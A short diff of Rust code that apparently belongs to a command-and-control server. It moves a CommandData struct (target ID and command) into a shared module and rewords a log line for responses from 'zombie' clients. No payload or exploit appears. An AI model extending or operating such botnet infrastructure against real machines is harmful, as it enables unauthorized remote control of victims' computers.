@@ -1,15 +1,8 @@
-use serde::{Deserialize, Serialize};
+use super::super::super::utils::types::command_payload::CommandData;
+use crate::c2s::types::client_store::ClientStore;
 use serde_json::Value;
 use socketioxide::extract::{Bin, Data, SocketRef};
 use tracing::info;
-
-use crate::c2s::types::client_store::ClientStore;
-
-#[derive(Deserialize, Debug, Serialize)]
-struct CommandData {
-    target_id: String,
-    command: String,
-}
 
 pub fn on_connect(socket: SocketRef, Data(_): Data<Value>, clients: ClientStore) {
     let socket_id = socket.id.to_string();
@@ -58,7 +51,7 @@ pub fn on_connect(socket: SocketRef, Data(_): Data<Value>, clients: ClientStore)
     socket.on(
         "command-response-from-zombie",
         |_: SocketRef, Data::<Value>(data), Bin(_)| {
-            info!("Received event: {:?}", data);
+            info!("Received event from zombie: {:?}", data);
         },
     );
 
